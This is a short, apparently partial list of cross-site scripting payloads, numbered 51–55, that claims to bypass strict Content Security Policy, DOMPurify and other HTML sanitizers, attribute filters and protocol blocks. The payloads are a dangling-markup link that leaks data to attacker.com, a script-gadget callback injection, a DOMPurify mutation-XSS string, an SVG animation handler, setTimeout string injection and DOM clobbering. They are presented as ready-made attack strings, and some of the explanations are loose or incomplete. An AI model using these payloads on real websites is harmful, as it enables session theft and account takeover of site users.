🔥 Exceptional payloads (hardened applications)
These are designed to bypass:

Strict CSP (no inline scripts, no eval, no unsafe-inline)

HTML sanitizers (DOMPurify, bleach, etc.)

Attribute filters (event handlers stripped)

Protocol restrictions (block javascript:)

51. CSP nonce / hash bypass using dangling markup
<img src=x onerror="alert(1)" won’t work if unsafe-inline is blocked. Instead, inject a dangling anchor:
<a href="//attacker.com/?cookie=
It doesn’t execute JS, but it leaks data (not alert). For a true alert(1) without inline script, you need a CSS injection + XS‑Leaks – but that’s not classic XSS.
Better: Use a pre‑existing trusted script gadget, e.g.,
<script src="/static/js/util.js?callback=alert(1)"></script> if callback parameter is unsafely reflected.

52. Mutation XSS (mXSS) against DOMPurify (when sanitizer runs first)
<form><math><mtext><option><mglyph><svg><mtext><style><img src=x onerror=alert(1)>
After DOMPurify removes dangerous tags, browser’s parser reassembles the broken tree and executes.

53. Non‑event handler, non‑script payload (uses <link> + onload via CSS)
Not directly alert, but can exfiltrate. For alert, use <svg><animate onbegin=alert(1)>

54. Using setTimeout with string injection (if CSP allows unsafe-eval)
<img src=x onerror="setTimeout('alert(1)',0)">

55. DOM clobbering to bypass sanitizer
Inject <form id="x"><input name="innerHTML" value="<img src=x onerror=alert(1)>">
Then if the page does document.write(x.innerHTML), the clobbered property triggers.

